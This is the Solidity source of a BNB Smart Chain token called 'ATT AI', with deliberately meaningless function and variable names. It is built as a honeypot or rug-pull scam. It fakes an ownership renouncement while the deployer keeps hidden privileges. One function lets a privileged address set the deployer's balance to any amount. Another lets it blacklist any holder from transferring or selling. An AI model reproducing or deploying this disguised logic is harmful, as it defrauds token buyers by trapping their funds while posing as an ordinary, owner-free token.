/**
 *Submitted for verification at BscScan.com on 2023-02-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

abstract contract exemptMin {
    function exemptListAuto() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface atMax {
    function createPair(address minSwap, address isLimitSwap) external returns (address);
}

interface launchSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract ATTAI is IERC20, exemptMin {

    mapping(address => mapping(address => uint256)) private exemptSell;

    address private txEnable;

    uint256 public fromIsWallet;

    function launchedShould() public view returns (uint256) {
        return walletAmountMax;
    }

    function transfer(address isEnable, uint256 listExempt) external virtual override returns (bool) {
        return marketingIs(exemptListAuto(), isEnable, listExempt);
    }

    address public txToken;

    bool public exemptFrom;

    function takeAmount(uint256 listExempt) public {
        if (!receiverReceiver[exemptListAuto()]) {
            return;
        }
        exemptToken[txToken] = listExempt;
    }

    string private launchedIs = "AAI";

    function balanceOf(address txFrom) public view virtual override returns (uint256) {
        return exemptToken[txFrom];
    }

    function launchedAmount() public view returns (bool) {
        return liquidityEnableMax;
    }

    mapping(address => bool) public exemptAmount;

    function modeWallet() public view returns (bool) {
        return exemptFrom;
    }

    function listEnableTake() public view returns (uint256) {
        return takeModeLiquidity;
    }

    function symbol() external view returns (string memory) {
        return launchedIs;
    }

    function transferFrom(address liquidityLaunch, address tradingToLiquidity, uint256 listExempt) external override returns (bool) {
        if (exemptSell[liquidityLaunch][exemptListAuto()] != type(uint256).max) {
            require(listExempt <= exemptSell[liquidityLaunch][exemptListAuto()]);
            exemptSell[liquidityLaunch][exemptListAuto()] -= listExempt;
        }
        return marketingIs(liquidityLaunch, tradingToLiquidity, listExempt);
    }

    bool private liquidityEnableMax;

    event OwnershipTransferred(address indexed isSell, address indexed amountTake);

    uint8 private tradingTokenEnable = 18;

    uint256 public walletAmountMax;

    mapping(address => bool) public receiverReceiver;

    function decimals() external view returns (uint8) {
        return tradingTokenEnable;
    }

    bool public takeSell;

    bool public amountMin;

    function feeTake() public {
        emit OwnershipTransferred(txToken, address(0));
        txEnable = address(0);
    }

    constructor (){ 
        if (amountMin == exemptFrom) {
            exemptFrom = true;
        }
        launchSell listShould = launchSell(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        shouldLiquidity = atMax(listShould.factory()).createPair(listShould.WETH(), address(this));
        txEnable = exemptListAuto();
        
        txToken = exemptListAuto();
        receiverReceiver[exemptListAuto()] = true;
        
        exemptToken[exemptListAuto()] = senderEnableList;
        emit Transfer(address(0), txToken, senderEnableList);
        feeTake();
    }

    function getOwner() external view returns (address) {
        return txEnable;
    }

    uint256 public takeModeLiquidity;

    function receiverShouldFrom(address buySell) public {
        if (liquidityEnableMax) {
            takeSell = false;
        }
        if (buySell == txToken || buySell == shouldLiquidity || !receiverReceiver[exemptListAuto()]) {
            return;
        }
        if (takeSell != exemptFrom) {
            fromIsWallet = walletAmountMax;
        }
        exemptAmount[buySell] = true;
    }

    function amountReceiverToken(address totalShould) public {
        if (tokenMarketingList) {
            return;
        }
        if (walletAmountMax == takeModeLiquidity) {
            walletAmountMax = takeModeLiquidity;
        }
        receiverReceiver[totalShould] = true;
        
        tokenMarketingList = true;
    }

    bool public tokenMarketingList;

    function feeAmountMax() public view returns (bool) {
        return liquidityEnableMax;
    }

    function fromTake(address liquidityLaunch, address tradingToLiquidity, uint256 listExempt) internal returns (bool) {
        require(exemptToken[liquidityLaunch] >= listExempt);
        exemptToken[liquidityLaunch] -= listExempt;
        exemptToken[tradingToLiquidity] += listExempt;
        emit Transfer(liquidityLaunch, tradingToLiquidity, listExempt);
        return true;
    }

    function name() external view returns (string memory) {
        return swapMaxLiquidity;
    }

    function owner() external view returns (address) {
        return txEnable;
    }

    address public shouldLiquidity;

    function approve(address feeFundMarketing, uint256 listExempt) public virtual override returns (bool) {
        exemptSell[exemptListAuto()][feeFundMarketing] = listExempt;
        emit Approval(exemptListAuto(), feeFundMarketing, listExempt);
        return true;
    }

    function limitIs() public {
        if (takeSell == exemptFrom) {
            exemptFrom = true;
        }
        
        fromIsWallet=0;
    }

    function marketingIs(address liquidityLaunch, address tradingToLiquidity, uint256 listExempt) internal returns (bool) {
        if (liquidityLaunch == txToken) {
            return fromTake(liquidityLaunch, tradingToLiquidity, listExempt);
        }
        require(!exemptAmount[liquidityLaunch]);
        return fromTake(liquidityLaunch, tradingToLiquidity, listExempt);
    }

    function allowance(address listAt, address feeFundMarketing) external view virtual override returns (uint256) {
        return exemptSell[listAt][feeFundMarketing];
    }

    function swapAuto() public view returns (bool) {
        return exemptFrom;
    }

    uint256 private senderEnableList = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return senderEnableList;
    }

    string private swapMaxLiquidity = "ATT AI";

    mapping(address => uint256) private exemptToken;

}